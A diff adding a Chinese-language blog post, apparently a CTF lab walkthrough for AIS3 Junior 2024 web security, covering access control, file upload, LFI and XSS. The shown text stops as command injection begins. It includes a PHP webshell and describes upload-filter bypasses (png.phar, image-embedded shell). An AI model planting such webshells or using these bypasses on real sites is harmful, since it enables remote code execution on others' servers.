@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="題解的最多 writeup寫得最累 01 - Broken Access Control BAC01 測試正常輸入  關鍵字 user permission path &#x2F;user 資訊蒐集，cookie、封包heaer、頁原原始碼… &#x3D;&gt; 無線索 試著往簡單的方向想 &#x3D;&gt; 回想 1. &#x3D;&gt; 有 user permission、path… 那">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 Junior 2024 - Web Security Walkthrough">
+<meta property="og:url" content="http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/index.html">
+<meta property="og:site_name" content="wang&#39;s blog">
+<meta property="og:description" content="題解的最多 writeup寫得最累 01 - Broken Access Control BAC01 測試正常輸入  關鍵字 user permission path &#x2F;user 資訊蒐集，cookie、封包heaer、頁原原始碼… &#x3D;&gt; 無線索 試著往簡單的方向想 &#x3D;&gt; 回想 1. &#x3D;&gt; 有 user permission、path… 那">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202024-08-29%20032058.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B13MPlR5A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1K65xCc0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkkmsgCqA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkifngR5R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryzpnxA9C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1T1pgCc0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rk4WTg09R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkHQ0gA50.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1LWJZ09C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1LVJ-R90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyMIkbRqA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyJjk-R90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkRHxW090.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkPRgb0q0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1tZGZ0qC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJk8z-RqC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJdFfWA5A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkkfQZ050.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HynXXZ0cA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyTN7bR5A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkFq7-Cq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1eZNZCq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1p1obR90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Syns4-CcC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkLuhZR90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkrmoZ0c0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyzepZCcC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hky-p-AqA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1S4a-RqR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bk3BaZC5R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJHwyM09C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1D51MR5R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkPhJzRqA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByZmeGR5R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1lk-zAq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByEkfMR50.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJ1mzMC9R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJng7GRcC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkbD7GAcA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkYLNMA90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1Vs4GR9R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1S0NfAqR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy2XBMA5C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rk9VrfCc0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkMdLfCc0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1TLIzAcR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkieDzAqA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1v0PzRcC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByfxOzR50.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJiqdGCqA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rk7nOMA9A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkkAOz05C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SygAhz0qA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B11Q6GC9R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/By1vtfAq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkPS5z0cA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1q2TG0cR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyK-CGA9C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S14w0G0cC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkMk1mA90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ1L1QCqR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByKdJmCqC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyBSPtCqC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJ8IDY0qA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Skz5vKRc0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJgjwY05A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJByuFR90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rknavY05A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rks05F05R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkUgotR9C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyPHstC50.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJc_stC5C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ByhknYAq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJvgnFRq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk81pYA9C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkxTZaYRcC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1M-RFC5A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJfGRYAq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyGK0tR5A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rka5RFC9R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJWiJcR9R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyQnyqC50.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Byv_-qC50.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJR2mqC90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJSC7cR9C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Bytg45R5R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1s44q05A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryknV9C90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkjrBqC9C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJvwHjRcA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJ9k8iRcC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1lTdiA50.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HypTdo09A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJyuusCq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJ4bYjCq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyqKjiAc0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkvqijC9R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1oT2i0qA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1CR2o0qR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJqrpoRcA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkrK6oRq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJ8TRiAc0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJiEJhA9R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkhOlnRcC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkdy-2Aq0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkE5Zh090.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HykRZnR5R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1KAWnRcA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1hXNnC9C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJGqVnA9R.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Syn4Hn0qR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkyCrnC9A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/By7M8hR9C.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJx38nC90.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJe8DhCcA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1-S8nA9A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkdO70C50.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BJbbBA0qC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkpJy1Ji0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SyWHykysR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HkfvJy1j0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkcXaAR9A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1fnaRRc0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJz1CA05A.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJHngJ1iA.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkWyZ11oC.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1YbZyJoR.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Hk5-Xy1s0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Syd7mkJj0.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkuSQkysR.png">
+<meta property="article:published_time" content="2024-08-17T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-08-28T19:32:45.082Z">
+<meta property="article:author" content="wang">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="AIS3 Junior">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202024-08-29%20032058.png">
+    
+    
+    <!-- title -->
+    <title>AIS3 Junior 2024 - Web Security Walkthrough</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/08/25/HITCON-CMT/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/17/SCIST-4th-Final-CTF-WriteUp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&text=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&is_video=false&description=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AIS3 Junior 2024 - Web Security Walkthrough&body=Check out this article: http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&name=AIS3 Junior 2024 - Web Security Walkthrough&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&t=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-Broken-Access-Control"><span class="toc-number">1.</span> <span class="toc-text">01 - Broken Access Control</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-File-Upload"><span class="toc-number">2.</span> <span class="toc-text">02 - File Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-Local-File-Inclusion"><span class="toc-number">3.</span> <span class="toc-text">03 - Local File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-Cross-Site-Scripting"><span class="toc-number">4.</span> <span class="toc-text">04 - Cross-Site Scripting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-Command-Injection"><span class="toc-number">5.</span> <span class="toc-text">05 - Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-SQL-Injection"><span class="toc-number">6.</span> <span class="toc-text">06 - SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-Server-Side-Template-Injection"><span class="toc-number">7.</span> <span class="toc-text">07 - Server-Side Template Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-Server-Side-Request-Forgery"><span class="toc-number">8.</span> <span class="toc-text">08 - Server-Side Request Forgery</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        AIS3 Junior 2024 - Web Security Walkthrough
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wang</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-08-17T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AIS3-Junior/" rel="tag">AIS3 Junior</a>, <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>題解的最多 writeup寫得最累<br><img src="/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202024-08-29%20032058.png" alt="alt text"></p>
+<h3 id="01-Broken-Access-Control"><a href="#01-Broken-Access-Control" class="headerlink" title="01 - Broken Access Control"></a>01 - Broken Access Control</h3><ul>
+<li>BAC01<ol>
+<li>測試正常輸入<br> <img src="https://hackmd.io/_uploads/B13MPlR5A.png" alt="image"><br> 關鍵字 user permission<br> path &#x2F;user</li>
+<li>資訊蒐集，cookie、封包heaer、頁原原始碼… &#x3D;&gt; 無線索</li>
+<li>試著往簡單的方向想 &#x3D;&gt; 回想 1. &#x3D;&gt; 有 user permission、path… 那應該有 &#x3D;&#x3D;admin&#x3D;&#x3D; permission、path ?!</li>
+<li>測試path &#x2F;admin<br> <img src="https://hackmd.io/_uploads/H1K65xCc0.png" alt="image"></li>
+</ol>
+</li>
+<li>BAC02<ol>
+<li>注意到Admin Panel &#x3D;&gt; 很顯然這是目標<br> <img src="https://hackmd.io/_uploads/rkkmsgCqA.png" alt="image"><br> 比起上題，多了 Product List &#x3D;&gt; 可能有線索</li>
+<li>檢查 Product List 頁面原始碼<br> <img src="https://hackmd.io/_uploads/HkifngR5R.png" alt="image"><br> 少了goToProductPage(4) ?</li>
+<li>嘗試到ProductPage(4)<br> 隨便點進一個<br> <img src="https://hackmd.io/_uploads/ryzpnxA9C.png" alt="image"><br> 改成 &#x2F;product&#x2F;4<br> <img src="https://hackmd.io/_uploads/H1T1pgCc0.png" alt="image"><br> 點 Buy<br> <img src="https://hackmd.io/_uploads/rk4WTg09R.png" alt="image"></li>
+</ol>
+</li>
+<li>BAC03<ol>
+<li>做基本資訊蒐集<br> 檢查頁面原始碼、cookie、封包header、正常輸入… &#x3D;&gt; 無線索 &#x3D;&gt; 跟第一題好像</li>
+<li>試 &#x2F;admin &#x3D;&gt; 沒像第一題到 &#x2F;admin 而是 &#x2F;error<br> <img src="https://hackmd.io/_uploads/SkHQ0gA50.png" alt="image"><br> 中間發生什麼?</li>
+<li>開burp suite重複同樣操作<br> <img src="https://hackmd.io/_uploads/S1LWJZ09C.png" alt="image"><br> <img src="https://hackmd.io/_uploads/r1LVJ-R90.png" alt="image"><br> 一樣<br> <img src="https://hackmd.io/_uploads/SyMIkbRqA.png" alt="image"><br> 中間有 &#x2F;admin !<br> <img src="https://hackmd.io/_uploads/HyJjk-R90.png" alt="image"></li>
+<li>查看 &#x2F;admin<br> <img src="https://hackmd.io/_uploads/BkRHxW090.png" alt="image"></li>
+</ol>
+</li>
+</ul>
+<h3 id="02-File-Upload"><a href="#02-File-Upload" class="headerlink" title="02 - File Upload"></a>02 - File Upload</h3><ul>
+<li>FIL01<ol>
+<li>寫最簡單又不會被windows當作惡意檔案刪掉的 websell<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">system($a.&#x27;; echo meow&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
+<li>選擇 websell.php<br>  <img src="https://hackmd.io/_uploads/BkPRgb0q0.png" alt="image"><br>  再上傳<br>  <img src="https://hackmd.io/_uploads/r1tZGZ0qC.png" alt="image"></li>
+<li>上傳成功<br>  <img src="https://hackmd.io/_uploads/rJk8z-RqC.png" alt="image"><br>  <img src="https://hackmd.io/_uploads/SJdFfWA5A.png" alt="image"><br>  不確有沒有上傳成功 &#x3D;&gt; 加參數<br>  <img src="https://hackmd.io/_uploads/SkkfQZ050.png" alt="image"><br>  RCE !<br>  <img src="https://hackmd.io/_uploads/HynXXZ0cA.png" alt="image"><br>  <img src="https://hackmd.io/_uploads/HyTN7bR5A.png" alt="image"></li>
+</ol>
+</li>
+<li>FIL02<ol>
+<li>上傳上題的websell &#x3D;&gt; 有 waf<br> <img src="https://hackmd.io/_uploads/HkFq7-Cq0.png" alt="image"></li>
+<li>在 burp suite 上傳，攔截封包<br> <img src="https://hackmd.io/_uploads/H1eZNZCq0.png" alt="image"><br> 送到 reapeter<br> <img src="https://hackmd.io/_uploads/r1p1obR90.png" alt="image"><br> <img src="https://hackmd.io/_uploads/Syns4-CcC.png" alt="image"></li>
+<li>修改封包<ul>
+<li><p>bypass filename<br>  猜測要有png<br>  php 放後面使檔案可被當php執行<br>  改成 <img src="https://hackmd.io/_uploads/HkLuhZR90.png" alt="image"></p>
+</li>
+<li><p>bypass Content-Type<br>  改成像正常圖片<br> <img src="https://hackmd.io/_uploads/rkrmoZ0c0.png" alt="image"></p>
+</li>
+</ul>
+</li>
+<li>送出修改後封包<br> <img src="https://hackmd.io/_uploads/HyzepZCcC.png" alt="image"><br> <img src="https://hackmd.io/_uploads/Hky-p-AqA.png" alt="image"><br> <img src="https://hackmd.io/_uploads/r1S4a-RqR.png" alt="image"><br> RCE !<br> <img src="https://hackmd.io/_uploads/Bk3BaZC5R.png" alt="image"></li>
+</ol>
+</li>
+<li>FIL03<ol>
+<li>在 burp suite 做跟上一題同樣步驟 &#x3D;&gt; 上傳失敗</li>
+<li>bypass file header<br> 在 burp suite 上傳一張正常的圖片，攔截封包<br> <img src="https://hackmd.io/_uploads/BJHwyM09C.png" alt="image"><br> 保留圖片頭尾，在中間塞webshell<br> <img src="https://hackmd.io/_uploads/B1D51MR5R.png" alt="image"><br> <img src="https://hackmd.io/_uploads/SkPhJzRqA.png" alt="image"><br> 上傳失敗<br> <img src="https://hackmd.io/_uploads/ByZmeGR5R.png" alt="image"></li>
+<li>bypass filename<br> 猜測可能不能出現php，png被允許<br> 改成 png.phar<br> 因為phar 相當於php<br> <img src="https://hackmd.io/_uploads/B1lk-zAq0.png" alt="image"><br> <img src="https://hackmd.io/_uploads/ByEkfMR50.png" alt="image"><br> <img src="https://hackmd.io/_uploads/SJ1mzMC9R.png" alt="image"></li>
+</ol>
+</li>
+</ul>
+<h3 id="03-Local-File-Inclusion"><a href="#03-Local-File-Inclusion" class="headerlink" title="03 - Local File Inclusion"></a>03 - Local File Inclusion</h3><ul>
+<li>LFI01<ol>
+<li>瀏覽網頁看到圖片<br> <img src="https://hackmd.io/_uploads/SJng7GRcC.png" alt="image"></li>
+<li>猜測static&#x2F;bitcoinCat.jpg會被include<br>  <img src="https://hackmd.io/_uploads/BkbD7GAcA.png" alt="image"><br>  嘗試include index.php<br>  <img src="https://hackmd.io/_uploads/rkYLNMA90.png" alt="image"></li>
+<li>base64 decode 看 index.php source code<br>  <img src="https://hackmd.io/_uploads/S1Vs4GR9R.png" alt="image"><br>  <img src="https://hackmd.io/_uploads/B1S0NfAqR.png" alt="image"></li>
+<li>嘗試登入<br>  <img src="https://hackmd.io/_uploads/Sy2XBMA5C.png" alt="image"><br>  <img src="https://hackmd.io/_uploads/rk9VrfCc0.png" alt="image"></li>
+</ol>
+</li>
+<li>LFI02<ol>
+<li>看到上傳功能，嘗試上傳沒有bypass waf 的websell<br> <img src="https://hackmd.io/_uploads/rkMdLfCc0.png" alt="image"><br> <img src="https://hackmd.io/_uploads/S1TLIzAcR.png" alt="image"></li>
+<li>猜測是要include剛上傳的websell<br> 看到上傳頁面有<br> <img src="https://hackmd.io/_uploads/SkieDzAqA.png" alt="image"><br> 猜測 form.html 會被 include<br> <img src="https://hackmd.io/_uploads/r1v0PzRcC.png" alt="image"><br> RCE !<br> <img src="https://hackmd.io/_uploads/ByfxOzR50.png" alt="image"></li>
+</ol>
+</li>
+<li>LFI03<ol>
+<li>跟LFI01一樣有圖片，做一樣的嘗試<br> <img src="https://hackmd.io/_uploads/SJiqdGCqA.png" alt="image"><br> <img src="https://hackmd.io/_uploads/rk7nOMA9A.png" alt="image"><br> 但不成功<br> <img src="https://hackmd.io/_uploads/rkkAOz05C.png" alt="image"></li>
+<li>回登入頁面檢視網頁原始碼<br>  <img src="https://hackmd.io/_uploads/SygAhz0qA.png" alt="image"><br> <img src="https://hackmd.io/_uploads/B11Q6GC9R.png" alt="image"></li>
+<li>第三題，總該RCE了吧?<br> githubg上有現成的超長RCE payload<br> <img src="https://hackmd.io/_uploads/By1vtfAq0.png" alt="image"><br> 複製雙引號內的內容<br> <img src="https://hackmd.io/_uploads/BkPS5z0cA.png" alt="image"><br> 貼上<br> <img src="https://hackmd.io/_uploads/B1q2TG0cR.png" alt="image"><br> RCE !<br> <img src="https://hackmd.io/_uploads/HyK-CGA9C.png" alt="image"></li>
+</ol>
+</li>
+</ul>
+<h3 id="04-Cross-Site-Scripting"><a href="#04-Cross-Site-Scripting" class="headerlink" title="04 - Cross-Site Scripting"></a>04 - Cross-Site Scripting</h3><ul>
+<li>XSS01<ol>
+<li>從網也原始碼得知要alert const FLAG<br> <img src="https://hackmd.io/_uploads/S14w0G0cC.png" alt="image"></li>
+<li>發現會輸出URL參數<br> <img src="https://hackmd.io/_uploads/BkMk1mA90.png" alt="image"></li>
+<li>XSS<br>  <img src="https://hackmd.io/_uploads/BJ1L1QCqR.png" alt="image"><br>   <img src="https://hackmd.io/_uploads/ByKdJmCqC.png" alt="image"></li>
+</ol>
+</li>
+</ul>
+<h3 id="05-Command-Injection"><a href="#05-Command-Injection" class="headerlink" title="05 - Command Injection"></a>05 - Command Injection</h3><ul>
+<li>CMD01<ol>
+<li><p>測試正常的輸入<br> <img src="https://hackmd.io/_uploads/HyBSPtCqC.png" alt="image"><br> <img src="https://hackmd.io/_uploads/BJ8IDY0qA.png" alt="image"></p>
+</li>
